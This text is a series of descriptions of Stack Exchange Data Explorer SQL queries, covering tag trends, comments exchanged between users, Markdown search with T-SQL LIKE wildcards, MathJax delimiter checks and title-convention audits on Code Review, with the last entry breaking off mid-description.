"This query is somewhat generic so that I can see trending for multiple tags. In this example I'm comparing different JavaScript Frameworks/Libraries, but these Tag names can be easily changed to any tag names you want. For a visual comparison, in the result click ""Graph"" tab. Very cool feature. I tried to make this a fast a possible by reviewing the execution plan. This probably can be made even faster, but happy with it now."

"Find comments exchanged between two users. This finds all comments that user1 left on user2's posts and vice versa. This also attempts to find comments on third-party posts with @ mentions, but this is only approximative: it's based on users' current display names rather than the name at time of posting, it includes @ mentions that actually target another user with a similar name, it misses @ mentions that use a prefix of the name, and it misses the case where a user replies to the sole comment under their own post. It's difficult to do better considering the complex rules surrounding comment notification targets."

"Do a generic T-SQL LIKE query on comment Markdown text and format the results nicely. Wildcards that work include % for any string, _ for any character, [ABCDE] or [A-E] for a letter from A to E, and [^ABCDE] or [^A-E] for any character *except* A to E. To match a literal ""%"", ""_"", ""["" or ""]"", insert a backslash (""\"") before it. Remember to wrap the search pattern in % signs if you don't want to anchor it to the beginning and/or end of the post, and remember that the content being searched is raw unparsed (mini-)Markdown, not HTML. This query will probably time out on SO unless you narrow down the date range! Try e.g. limiting the search to comments made within one or two years. On smaller sites, you can leave in the default values."

"Before enabling MathJax on Code Review (see request http://meta.codereview.stackexchange.com/q/1438), it would be a good idea to check whether any text in existing posts would be unintentionally rendered as TeX. Obviously, using $…$ delimiters would be a bad idea on Code Review, since $ is a very common character in programming languages. But would it be safe to use \$…\$ to delimit MathJax markup, as in Electrical Engineering Stack Exchange? This query strips out the code markup from all questions and answers, then looks for ""\$"". Hopefully, the search results turn out empty! (Display equations, created using $$…$$ as a complete paragraph, are difficult to trigger accidentally, so we shouldn't have to worry about those.)"

"As decided in http://meta.codereview.stackexchange.com/q/2454, Code Review requires question titles to describe the purpose of the code, rather than the author's concern about the code. As a result, questions that do not follow that convention either need to have their titles revised, or they may be off-topic altogether. This query helps find such problematic questions."
"This is an attempt at a rough measure of a user's technical content on quantum mechanics answers. This measures a surrogate, which is the use of LaTeX \rangle (i.e. the Dirac ket marker ⟩) as a sign of how often the user uses that language.
